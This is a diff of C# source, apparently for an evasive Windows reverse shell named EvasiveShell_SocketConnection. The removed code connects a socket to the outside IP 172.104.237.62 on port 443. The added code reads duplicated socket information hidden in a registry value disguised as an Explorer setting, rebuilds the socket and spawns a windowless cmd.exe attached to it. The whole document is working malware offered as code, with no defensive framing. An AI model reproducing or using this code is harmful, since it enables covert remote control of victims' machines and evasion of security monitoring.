@@ -2,41 +2,12 @@
 using System.Runtime.InteropServices;
 using System;
 using SocketHelpers;
+using Microsoft.Win32;
 
 namespace EvasiveShell_SocketConnection
 {
   internal class Program
   {
-    [StructLayout(LayoutKind.Sequential)]
-    public struct sockaddr_in
-    {
-      public short sin_family;
-
-      public ushort sin_port;
-
-      public in_addr sin_addr;
-
-      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
-      public string sin_zero;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct in_addr
-    {
-      public uint S_addr;
-    }
-
-    /// <summary>
-    /// Importierte Methode um ein Socket zu connecten.
-    /// Dokumentation: https://learn.microsoft.com/de-de/windows/win32/api/winsock2/nf-winsock2-connect
-    /// </summary>
-    /// <param name="socket">Das Socket.</param>
-    /// <param name="name">Pointer auf eine SockAddr Struktur. <see cref="https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2"/></param>
-    /// <param name="namelen">Länge der Sockaddr Struktur</param>
-    /// <returns></returns>
-    [DllImport("Ws2_32.dll", SetLastError = true)]
-    public static extern int connect(IntPtr socket, IntPtr name, int namelen);
-
     [DllImport("kernel32.dll")]
     public static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
 
@@ -125,42 +96,29 @@ namespace EvasiveShell_SocketConnection
       public uint[] ChainEntries;
     }
 
-    [DllImport("Ws2_32.dll", SetLastError = true)]
-    public static extern ushort htons(ushort port);
-
-    [DllImport("Ws2_32.dll", SetLastError = true)]
-    public static extern uint inet_addr(string ipAddress);
-
-
     static void Main(string[] args)
     {
       Helpers.InitializeWSA();
 
+      string value = string.Empty;
       bool exists = false;
-
       do
       {
-        exists = File.Exists("C:\\Temp\\socketinfo.bin");
+        var obj = Registry.GetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "SessionData", null);
+        exists = !string.IsNullOrWhiteSpace(obj?.ToString());
+
+        if (exists)
+          value = obj.ToString();
+
         Thread.Sleep(20);
-      } 
+      }
       while (!exists);
 
-      var serialized = File.ReadAllBytes("C:\\Temp\\socketinfo.bin");
-      var protocolInfo = DeserializeProtocolInfo(serialized);
+      var protocolInfo = DeserializeProtocolInfo(Convert.FromBase64String(value));
       IntPtr socket = WSASocketA(2, 1, 6, ref protocolInfo, 0, 0);
       
       if (socket == IntPtr.Zero)
         Environment.Exit(1);
-
-      var sockAddrIn = new sockaddr_in();
-      sockAddrIn.sin_family = 2;
-      sockAddrIn.sin_port = htons(443);
-      sockAddrIn.sin_addr.S_addr = inet_addr("172.104.237.62");
-
-      var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
-      Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);
-
-      connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
 
       var socketHandle = new SafeSocketHandle(socket, false);
       STARTUPINFO startupInfo = new STARTUPINFO();
@@ -173,8 +131,9 @@ namespace EvasiveShell_SocketConnection
 
       PROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
       CreateProcessA(null, @"C:\\Windows\\System32\\cmd.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);
-    }
 
+      Console.WriteLine("Create success");
+    }
     private static WSAPROTOCOL_INFO DeserializeProtocolInfo(byte[] arr)
     {
       WSAPROTOCOL_INFO protocolInfo = new WSAPROTOCOL_INFO();
